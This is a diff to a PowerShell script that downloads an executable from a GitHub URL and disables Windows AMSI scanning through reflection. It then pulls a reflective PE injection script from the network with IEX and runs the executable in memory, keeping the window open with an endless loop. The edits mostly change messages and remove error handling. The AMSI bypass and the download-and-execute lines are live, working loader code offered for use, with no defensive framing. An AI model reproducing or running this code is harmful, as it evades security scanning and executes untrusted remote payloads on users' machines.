@@ -1,5 +1,5 @@
 # ===============================================
-# Run GUI EXE from URL + Force Keep Window Open
+# Run GUI EXE from URL + FORCE Keep Window Open
 # ===============================================
 
 $Url = "https://raw.githubusercontent.com/VortexStore/headhunter/refs/heads/main/WebLoader.exe"
@@ -7,21 +7,15 @@ $Arguments = ""
 
 Write-Host "[+] Downloading EXE from URL..." -ForegroundColor Cyan
 
-try {
-    $WebClient = New-Object System.Net.WebClient
-    $WebClient.Headers.Add("User-Agent", "Mozilla/5.0")
-    $PEBytes = $WebClient.DownloadData($Url)
-    Write-Host "[+] Downloaded $($PEBytes.Length) bytes" -ForegroundColor Green
-} catch {
-    Write-Host "[-] Download failed!" -ForegroundColor Red
-    pause
-    exit
-}
+$WebClient = New-Object System.Net.WebClient
+$WebClient.Headers.Add("User-Agent", "Mozilla/5.0")
+$PEBytes = $WebClient.DownloadData($Url)
+Write-Host "[+] Downloaded $($PEBytes.Length) bytes" -ForegroundColor Green
 
 # AMSI Bypass
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-# Load Reflective PE Loader
+# Load Loader
 Write-Host "[+] Loading Reflective PE Injection..." -ForegroundColor Yellow
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/charnim/Invoke-ReflectivePEInjection.ps1/main/Invoke-ReflectivePEInjection.ps1')
 
@@ -35,17 +29,19 @@ try {
     }
     
     Write-Host "[+] GUI Program Launched Successfully!" -ForegroundColor Green
-    Write-Host "`nProgram should be running now." -ForegroundColor Yellow
-    
+    Write-Host "The program window should appear soon..." -ForegroundColor Yellow
+
 } catch {
-    Write-Host "[-] Injection Error: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
 }
 
 # ================== FORCE KEEP WINDOW OPEN ==================
-Write-Host "`n=== This window will stay open ===" -ForegroundColor Magenta
-Write-Host "Close this window manually when you are done." -ForegroundColor Cyan
+Write-Host "`n=========================================" -ForegroundColor Magenta
+Write-Host "     POWERShell WINDOW IS KEPT OPEN" -ForegroundColor Magenta
+Write-Host "=========================================" -ForegroundColor Magenta
+Write-Host "Close this window manually when done." -ForegroundColor Cyan
 
-# Infinite loop to prevent auto close
+# Strong keep-alive loop (placed right after injection)
 while ($true) {
-    Start-Sleep -Seconds 5
+    Start-Sleep -Seconds 3
 }
